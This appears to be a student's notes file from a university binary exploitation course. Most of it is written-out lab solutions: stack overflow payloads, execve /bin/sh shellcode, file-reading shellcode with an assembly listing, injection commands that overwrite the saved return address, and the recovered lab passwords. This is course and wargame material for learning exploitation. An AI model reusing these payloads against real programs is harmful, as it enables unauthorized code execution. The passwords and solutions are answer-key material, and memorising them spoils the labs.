@@ -1,0 +1,276 @@
+Wed 7-10 Sage 3101
+
+irc.rpis.ec
+6667
+#rpisec
+
+binexp_ta@cs.lists.rpi.edu
+
+
+* <2015-01-27 Tue> x86
+Course in 32bit.  906 instructions in base set.  Intel syntax in this
+couse.
+
+* <2015-01-30 Fri> loading
+What happens when you run the binary? Lots of scary stuff.
+Reverse engineering deals with only the binary on; no source 
+code, no compilation/linking/assembling.
+
+* Reverse engineering domain
+** Static
+What happens before running.  
+** strings
+Prints ASCII null terminated printable strings of length 4 or more 
+in a file (i.e. binary); get dat password dawg.
+* <2015-02-13 Fri> lab2
+** pw 1 lab2start
+** C 
+Overflowed buf to write 0xdeadbeef to set_me.
+./lab2C `python -c "print 'A'*15 + '\xef\xbe\xad\xde'"`
+1m_all_ab0ut_d4t_b33f
+** B
+Forced print_name() to return to shell() instead of main and 
+made shell()'s arg point to exec_string to execute the shell.
+./lab2B `python -c "print 'A'*27 + '\x7D\x84\x04\x08' + 'A'*4 + '\xA0\x85\x04\x08'"`
+exec string address: 0x080485A0
+shell() address: 0x0804847d
+i_c4ll_wh4t_i_w4nt_n00b
+** A
+Bash:
+python -c "print 'ABCD'*100" > /tmp/video_games/foo.txt
+0x8434441
+python -c "print '\xCDB\x04\x84'*100 + '\n'"  > /tmp/video_games/foo.txt
+
+in gdb:
+run < /tmp/video_games/foo.txt
+
+shell() address: 0x080484cd
+ret address: 0x0804858D
+D1d_y0u_enj0y_y0ur_cats?
+* <2015-02-24 Tue> Lab 3
+** C
+Get a shell with:
+payload: (python -c 'print "rpisec\n" + "\x90" * 30 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x90" * 22 + "\x3c\xf6\xff\xbf\n"'; cat;) | /levels/lab3/lab3C
+
+th3r3_iz_n0_4dm1ns_0n1y_U!
+** B
+Payload opens the .pass file, reads its contents, and writes them to stdout.
+
+shell_script = "\x31\xDB\x31\xC9\xF7\xE3\xB0\x73\x50\x68\x2E\x70\x61\x73\x68\x62\x33\x41\x2F\x68\\
+x65\x2F\x6C\x61\x68\x2F\x68\x6F\x6D\xB0\x05\x89\xE3\xCD\x80\x89\xC3\x81\xEC\x00\x05\x00\x00\x89\x\
+E1\xBA\x32\x00\x00\x00\xB8\x03\x00\x00\x00\xCD\x80\xBB\x01\x00\x00\x00\x89\xE1\x89\xC2\xB8\x04\x0\
+0\x00\x00\xCD\x80\xB0\x01\x31\xDB\xCD\x80"
+
+
+Padding to 156 bytes, which is the distance from the buffer in the given 
+code to the return address.
+print "\x90"*39 + shell_script + "\x90"*38 + "\xb0\xfa\xff\xbf"
+
+wh0_n33ds_5h3ll3_wh3n_U_h4z_s4nd
+** A
+The "cat" payload from part B was reused for the purposes of this lab.  
+The lab obstacle (every 3rd array entry being unaccessible null bytes) 
+was addressed by using the byte immediately before every 3rd entry to 
+produce the assembly "sub eax, 0x00000000", effectively nullifying the 
+null bytes.  There were thus many 7 byte wide chunks to fit the actual 
+code.  As many instructions as possible would be placed in these bytes, 
+with the rest of the space occupied by nops.  
+
+The resulting assembly is:
+
+; shellcode to simulate the cat, for lab3A
+Section .text
+global _start
+
+_start:
+    ; clear a bunch of registers
+    xor ebx, ebx
+    mul ebx
+
+    ; put 0 in ecx ( O_RDONLY ) and edx ( mode 0 ) is already 0 from the mul above
+    ; xor edx, edx
+    xor ecx, ecx
+    nop
+    sub eax, 0x00000000
+
+    ; "/home/lab3end/.pass"
+    push 0x00737361
+    nop
+    nop
+    sub eax, 0x00000000
+    push 0x702e2f64
+    nop
+    nop
+    sub eax, 0x00000000
+    push 0x6e653362
+    nop
+    nop
+    sub eax, 0x00000000
+    push 0x616c2f65
+    nop
+    nop
+    sub eax, 0x00000000
+    push 0x6d6f682f
+    nop
+    nop
+    sub eax, 0x00000000
+
+    mov ebx, esp
+    mov al, 5
+    int 0x80
+    nop
+    sub eax, 0x00000000
+
+    ; at this point eax contains the file descriptor for the file we opened
+    mov ebx, eax
+
+    ; decrement the stack pointer so we don't overwrite our shellcode
+    mov ecx, esp
+    nop
+    nop
+    nop
+    sub eax, 0x00000000
+    sub ecx, 0x200
+    nop
+    sub eax, 0x00000000
+
+    ; how many chars to read
+    mov edx, 60
+    nop
+    nop
+    sub eax, 0x00000000
+
+    ; read
+    mov eax, 3
+    nop
+    nop
+    sub eax, 0x00000000
+    int 0x80
+
+    ; which interrupt
+    mov eax, 4
+    sub eax, 0x00000000
+    ; which file descriptor
+    mov ebx, 1
+    nop
+    nop
+    sub eax, 0x00000000
+    ; length of string to read
+    mov edx, 60
+    nop
+    nop
+    sub eax, 0x00000000
+    int 0x80
+
+    ; exit
+    mov eax, 1
+    sub eax, 0x00000000
+    xor ebx, ebx
+    int 0x80
+
+The assembly between each 0x00000000 was converted to a decimal 
+representation to be stored using the program's interface.  Finally, 
+the EIP of main() was overwritten by accessing data out of bounds. 
+The appropriate values of the index and the EIP value were gotten 
+using gdb's i frame command and ltrace, respectively.  The 
+final series of commands was thus:
+
+store
+3824671537
+1
+store
+764463409
+2
+store
+1936941416
+4
+store
+764448768
+5
+store
+774857832
+7
+store
+764448880
+8
+store
+1697866344
+10
+store
+764448878
+11
+store
+1815045480
+13
+store
+764448865
+14
+store
+1869098856
+16
+store
+764448877
+17
+store
+95478665
+19
+store
+764444877
+20
+store
+3783902089
+22
+store
+764448912
+23
+store
+33614209
+25
+store
+764411904
+26
+store
+15546
+28
+store
+764448768
+29
+store
+952
+31
+store
+764448768
+32
+store
+79200461
+34
+store
+754974720
+35
+store
+443
+37
+store
+764448768
+38
+store
+15546
+40
+store
+764448768
+41
+store
+28868813
+43
+store
+754974720
+44
+store
+2160974641
+46
+store
+3221222588
+113
+quit
+
+The password printed out is sw00g1ty_sw4p_h0w_ab0ut_d3m_h0ps.
